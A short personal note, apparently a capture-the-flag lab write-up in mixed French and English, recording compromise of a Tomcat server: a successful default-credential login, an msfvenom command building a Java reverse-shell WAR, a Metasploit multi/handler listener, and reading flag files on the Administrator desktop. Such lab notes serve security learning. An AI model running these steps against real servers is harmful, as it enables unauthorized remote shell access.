@@ -1,0 +1,12 @@
+tomcat exploitation msf
+[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
+
+créer reverse shell grace a msfvenom -p java/shell_reverse_tcp LHOST=myip LPORT=celuisquetuveux -f war(extension) > shell.war
+uitiliser le reverse shell dans la partie WAR (shell.war)
+puis listen sur 4444 (mon shell)
+puis msfconsole 
+use exploit/multi/handler
+set payload java/shell_reverse_tcp
+
+C:\Users\Administrator\Desktop\flags>more "2 for the price of 1.txt"
+okay O_o'
